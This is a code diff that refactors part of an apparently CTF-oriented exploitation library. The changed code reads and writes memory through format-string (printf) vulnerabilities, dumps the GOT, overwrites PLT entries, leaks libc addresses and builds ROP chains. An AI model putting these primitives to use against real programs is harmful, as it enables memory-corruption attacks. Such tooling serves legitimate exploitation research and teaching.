@@ -5,11 +5,30 @@ import abc
 import struct
 import string # pylint: disable=deprecated-module
 import itertools
+import functools
 
 from .errors import NotLeetEnough
 from .formatter import absolute_string, offset_read
 from .architectures import x86
 from .rop import ROPChain
+
+def _safe_unsafe(f):
+    '''
+    If safe is None, try safe first, then unsafe.
+    '''
+
+    @functools.wraps(f)
+    def wrapper(*args, **kwargs):
+        if 'safe' not in kwargs or kwargs['safe'] is None:
+            try:
+                kwargs['safe'] = True
+                return f(*args, **kwargs)
+            except NotLeetEnough:
+                kwargs['safe'] = False
+                return f(*args, **kwargs)
+
+    return wrapper
+
 
 # pylint: disable=no-self-use,unused-argument
 class Manipulator:
@@ -96,13 +115,9 @@ class Manipulator:
     # Actions!
     #
 
+    @_safe_unsafe
     def do_memory_read(self, addr, length, safe=None):
         ''' Finds and executes an vuln that does a memory read. '''
-
-        # if safe is None, try safe first, then unsafe
-        if safe is None:
-            try: return self.do_memory_read(addr, length, safe=True)
-            except NotLeetEnough: return self.do_memory_read(addr, length, safe=False)
 
         # first, try to do it directly
         try:
@@ -124,17 +139,14 @@ class Manipulator:
         # now do the printf path
         return self.do_printf_read(addr, length, safe=safe)
 
+    @_safe_unsafe
     def do_register_read(self, reg, safe=None):
         ''' Finds and executes an vuln that does a register read. '''
         return self._do_vuln('register_read', (reg,), { }, safe=True)
 
+    @_safe_unsafe
     def do_memory_write(self, addr, content, safe=None):
         ''' Finds and executes an vuln that does a memory write. '''
-
-        # if safe is None, try safe first, then unsafe
-        if safe is None:
-            try: return self.do_memory_write(addr, content, safe=True)
-            except NotLeetEnough: return self.do_memory_write(addr, content, safe=False)
 
         l.debug("First trying a direct memory write.")
         try:
@@ -145,10 +157,12 @@ class Manipulator:
         l.debug("Now trying a naive printf write.")
         return self.do_printf_write((addr, content), safe=None)
 
+    @_safe_unsafe
     def do_register_write(self, reg, content, safe=None):
         ''' Finds and executes an vuln that does a register write. '''
         return self._do_vuln('register_write', (reg, content), { }, safe=True)
 
+    @_safe_unsafe
     def do_printf(self, fmt, safe=None):
         '''
         Finds and executes an vuln that does a memory read.
@@ -158,6 +172,7 @@ class Manipulator:
         '''
         return self._do_vuln('printf', (fmt,), { }, safe=None)
 
+    @_safe_unsafe
     def do_printf_read(self, addr, length, safe=None):
         '''
         Do a printf-based memory read.
@@ -197,6 +212,7 @@ class Manipulator:
 
         return content
 
+    @_safe_unsafe
     def do_printf_write(self, writes, safe=None):
         '''
         Do a memory write using a printf vulnerability.
@@ -221,6 +237,25 @@ class Manipulator:
 
         return ""
 
+    @_safe_unsafe
+    def do_relative_read(self, offset, length, reg=None, safe=None):
+        try:
+            reg = self.arch.sp_name if reg is None else reg
+            return self.do_memory_read(self.do_register_read(reg) + offset, length)
+        except NotLeetEnough:
+            if reg != self.arch.sp_name:
+                raise
+
+            funcs = self._get_vulns('printf', safe)
+            for f in funcs:
+                result = ""
+                max_i = (length + self.arch.bytes - 1) / self.arch.bytes
+                while len(result) < length:
+                    fmt = offset_read(offset/self.arch.bytes + len(result)/(self.arch.bytes*2), self.arch.bytes*2, max_length=f.puppeteer_flags['max_fmt_size'], max_offset=max_i, round_to=self.arch.bytes, pad_with='_')
+                    result += f(fmt).replace('_', '')
+
+            return self.fix_endness_strided(result.decode('hex'))
+
     #
     # More complex stuff
     #
@@ -232,24 +267,6 @@ class Manipulator:
 
     def dump_got(self, which, safe=None):
         return self.do_memory_read(self.got_base, self.got_size*self.arch.bytes, safe=safe)
-
-    def do_relative_read(self, offset, length, reg=None):
-        try:
-            reg = self.arch.sp_name if reg is None else reg
-            return self.do_memory_read(self.do_register_read(reg) + offset, length)
-        except NotLeetEnough:
-            if reg != self.arch.sp_name:
-                raise
-
-            funcs = self._get_vulns('printf', None)
-            for f in funcs:
-                result = ""
-                max_i = (length + self.arch.bytes - 1) / self.arch.bytes
-                while len(result) < length:
-                    fmt = offset_read(offset/self.arch.bytes + len(result)/(self.arch.bytes*2), self.arch.bytes*2, max_length=f.puppeteer_flags['max_fmt_size'], max_offset=max_i, round_to=self.arch.bytes, pad_with='_')
-                    result += f(fmt).replace('_', '')
-
-            return self.fix_endness_strided(result.decode('hex'))
 
     def do_page_read(self, addr):
         base = addr - (addr % self.arch.page_size)
@@ -264,7 +281,7 @@ class Manipulator:
         '''
         self.do_memory_write(self.plt[name], self.pack(target), safe=safe)
 
-    def read_stack(self, length, safe=None):
+    def read_stack(self, length):
         '''
         Read the stack, from the current stack pointer (or something close), to sp+length
 
@@ -273,14 +290,15 @@ class Manipulator:
         @params safe: if True, only do a safe read, if False, only do an unsafe read, if None do either
         '''
 
-        # if safe is None, try safe first, then unsafe
-        if safe is None:
-            try: return self.read_stack(length, safe=True)
-            except NotLeetEnough: return self.read_stack(length, safe=False)
-
         return self.do_relative_read(0, length, reg=self.arch.sp_name)
 
     def main_return_address(self, start_offset=1):
+        '''
+        Get the return address that main will return to. This is usually
+        libc_start_main, in libc, which gets you the address of (and a pointer
+        into) libc off of a relative read.
+        '''
+
         # strategy:
         # 1. search for a return address to main
         # 2. look for main's return address (to __libc_start_main)
@@ -306,7 +324,7 @@ class Manipulator:
     #
     # Crazy UI
     #
-    def memory_display_page(self, p, addr):
+    def memory_display(self, p, addr):
         perline = 24
         print ""
         print "# Displaying the page at 0x" + (self.arch.python_fmt % addr)
@@ -343,6 +361,10 @@ class Manipulator:
             print " ".join([ self.arch.python_fmt % c for c in line ])
 
     def memory_explorer(self):
+        '''
+        This launches an interactive memory explorer, using a memory read vuln.
+        It should probably be moved somewhere else.
+        '''
         print "###"
         print "### Super Memory Explorer 64"
         print "###"
@@ -379,7 +401,7 @@ class Manipulator:
             addr -= addr % self.arch.page_size
 
             p = self.do_page_read(addr)
-            self.memory_display_page(p, addr)
+            self.memory_display(p, addr)
 
 
 
@@ -388,47 +410,7 @@ class Manipulator:
     #
 
     def new_rop(self, chain=None, length=None):
+        '''
+        This returns a new ROP chain that you can then add ROP craziness to.
+        '''
         return ROPChain(arch=self.arch, chain=chain, length=length)
-
-    def rop_site_array(self, call_target, ret_target, args, cleanup=True):
-        '''
-        Returns a callsite for a piece of a ROP chain. Args and the ret_target
-        can be None, in which case they'll either not be written (when doing an
-        array write) or will be replaced with 0x41414141* (when doing a string
-        write).
-        '''
-        s = [ ]
-
-        # this is what we're calling
-        s.append(self.pack(call_target))
-
-        # this is where we'll return to immediately
-        if cleanup:
-            s.append(self.pack(self.rop_cleanups[len(args)]))
-        else:
-            s.append(self.pack(ret_target))
-
-        # our arguments
-        for a in args:
-            if a is not None:
-                s.append(self.pack(a))
-            else:
-                s.append(None)
-
-        # if we're cleaning up, *now* we return to the ret target
-        if cleanup and ret_target is not None:
-            s.append(self.pack(ret_target))
-
-        return s
-
-    def rop_site_bytes(self, *args, **kwargs):
-        '''
-        Returns a string of a callsite for a piece of a ROP chain.
-        '''
-        s = ""
-        for w in self.rop_site_array(*args, **kwargs):
-            if w is not None:
-                s += w
-            else:
-                s += 'A' * self.arch.bytes
-        return s
